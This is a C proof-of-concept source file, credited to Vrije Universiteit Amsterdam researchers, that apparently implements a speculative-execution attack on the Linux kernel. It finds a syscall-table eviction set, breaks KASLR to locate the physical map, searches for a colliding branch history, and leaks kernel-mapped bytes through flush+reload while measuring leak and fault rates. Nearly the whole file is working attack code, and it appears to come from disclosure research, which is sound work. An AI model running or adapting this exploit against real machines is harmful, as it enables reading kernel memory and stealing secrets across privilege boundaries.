/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <sys/syscall.h>
#include <sys/time.h>

#include "targets.h"
#include "flush_and_reload.h"
#include "colliding_bhb.h"

#include "../../poc-common/common.h"
#include "../../poc-common/kaslr_prefetch/kaslr_prefetch.h"
#include "../../poc-common/l2_eviction/evict_sys_table_l2.h"


// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------

#define LEAK_RATE_TEST_SIZE (1 << 15) // 32 kB; NOTE: max HUGE_PAGE_SIZE - 0x2000

void leak_test_leakage_rate(struct config * cfg) {

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We set the the F+R buf to the second 4k page in the huge page
    cfg->fr_buf = cfg->ind_map + 0x1000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x1000;

    // We initialize the secret from the third 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++) {
        secret[i] = (uint8_t) rand();
    }
    memset(secret, 0, 3); // First 3 bytes are zero to start the leak

    uint8_t * leaked_bytes = calloc(1, LEAK_RATE_TEST_SIZE);

    set_load_chain_leak_secret(cfg);
    cfg->reload_addr = cfg->fr_buf;

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 3;

    prefix = *(uint32_t *) (cur_byte - 3);

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;

    gettimeofday(&t0, NULL);


    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        prefix = *(uint32_t *) (cur_byte - 3);

        found = leak_byte_forwards(cfg, prefix);

        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
        }

        *cur_byte = found;


        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

        if (i % (LEAK_RATE_TEST_SIZE / 50) == 0) {
            step++;
            printf("\r[%.*s", step, "..................................................");
            fflush(stdout);
        }

    }

    gettimeofday(&t1, NULL);

    uint64_t delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\n%d kB took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE / 1024, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);


}

// ----------------------------------------------------------------------------
// MAIN
//
// ----------------------------------------------------------------------------


int main(int argc, char **argv)
{
    struct config cfg = {0};
    int opt;
    uint64_t time_start;
    uint64_t sys_call_table_off = 0x260; // VM Default
    uint64_t target_base = 0;
    uint64_t unix_poll_addr = 0;
    char colliding_history[MAX_HISTORY_SIZE+1] = "";


    while ((opt = getopt(argc, argv, "u:t:h:o:")) != -1) {
        switch (opt) {
            case 'h':
                strncpy(colliding_history, optarg, MAX_HISTORY_SIZE);
                colliding_history[MAX_HISTORY_SIZE] = '\x00';
                printf("Colliding history provided!\n");
                break;
            case 'o':
                sscanf(optarg, "0x%lx", &sys_call_table_off);
                break;
            case 't':
                sscanf(optarg, "%lx", &target_base);
                break;
            case 'u':
                sscanf(optarg, "%lx", &unix_poll_addr);
                break;
            default:
                printf("Usage:\n"
                    "%s -t TARGET_BASE [options]\n"
                    "  -t TARGET_BASE     target base address (of_css)\n"
                    "  -h HISTORY         a previous found colliding history\n"
                    "  -u                 unix_poll address (required with -f)\n"
                    , argv[0]);
                exit(1);
        }
    }

    if (target_base == 0) {
        printf("Usage:\n"
            "%s -t TARGET_BASE [options]\n"
            "  -t TARGET_BASE     target base address (of_css)\n"
            "  -h HISTORY         a previous found colliding history\n"
            "  -f FAST            Disable FineIBT check during collision finding\n"
            "  -u                 unix_poll address (required with -f)\n"
            , argv[0]);
        exit(1);
    }

    int seed = time(0);
    printf("Seed: %d\n", seed);
    srand(seed);


    // ------------------------------------------------------------------------
    // Allocate a huge page
    cfg.ind_map = allocate_huge_page();

    // ------------------------------------------------------------------------
    // Find Eviction set for syscall table

    printf("------------------------------------------------------\n");
    printf("Finding eviction set for syscall table\n");
    printf("------------------------------------------------------\n");

    time_start = time(0);

    find_ev_set_for_sys_call_table(sys_call_table_off);

    printf("[+] Step took: %ldsec\n", time(0) - time_start);


    // ------------------------------------------------------------------------
    // Find the physical map start by KASLR break

    printf("------------------------------------------------------\n");
    printf("Find physical map start address\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);

#if 1
    for (size_t i = 0; i < 5 && cfg.phys_start == 0; i++)
    {
        cfg.phys_start = (uint8_t *) find_phys_map_start();
    }
    if (cfg.phys_start == 0) {
        printf("Failed finding Physical Map start!");
        exit(EXIT_FAILURE);
    }
#else
    cfg.phys_start = (uint8_t *)  0xffff888000000000;

#endif

    printf("Direct Physical Map start: %p\n", cfg.phys_start);
    printf("[+] Step took: %ld sec\n", time(0) - time_start);


    // ------------------------------------------------------------------------
    // Setup buffers

    cfg.history = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);

    // ------------------------------------------------------------------------
    // Find the kernel address of our huge page


    cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));

    while ((uint64_t) cfg.ind_map_kern % HUGE_PAGE_SIZE != 0)
    {
        printf("Invalid huge_page! User: %p Kernel: %p\n", cfg.ind_map, cfg.ind_map_kern);
        sleep(1);
        cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));
    }
    printf(" - User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);

    cfg.fr_buf = cfg.ind_map + 0x1000;
    cfg.fr_buf_kern = cfg.ind_map_kern + 0x1000;
    printf(" - User FR_BUF: %p Kernel FR_BUF: %p\n", cfg.fr_buf, cfg.fr_buf_kern);

    memset(cfg.fr_buf, 0x90, 64);

    cfg.tfp_leak_target = (uint8_t *) (target_base);
    printf(" - TFP_LEAK_TARGET: %p\n", cfg.tfp_leak_target);



    // ------------------------------------------------------------------------
    // Find a colliding history

    printf("------------------------------------------------------\n");
    printf("Find a colliding history for the victim -> target\n");
    printf("------------------------------------------------------\n");
    time_start = time(0);


    if(strlen(colliding_history) == MAX_HISTORY_SIZE) {
        for(int i = 0; i < MAX_HISTORY_SIZE; i++) {
            cfg.history[i] = colliding_history[i] - '0';
        }
    } else {

        find_colliding_history(&cfg, 1);

    }

    printf("[+] Step took: %ld sec\n", time(0) - time_start);

    // ------------------------------------------------------------------------
    // Double check signal

    printf("----------------------------------------------- \n");

    print_leakage_rate(&cfg, 50000);

    printf("------------------------------------------------------\n");
    printf("Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
    printf("------------------------------------------------------\n");

    while (1)
    {
        leak_test_leakage_rate(&cfg);
    }

}
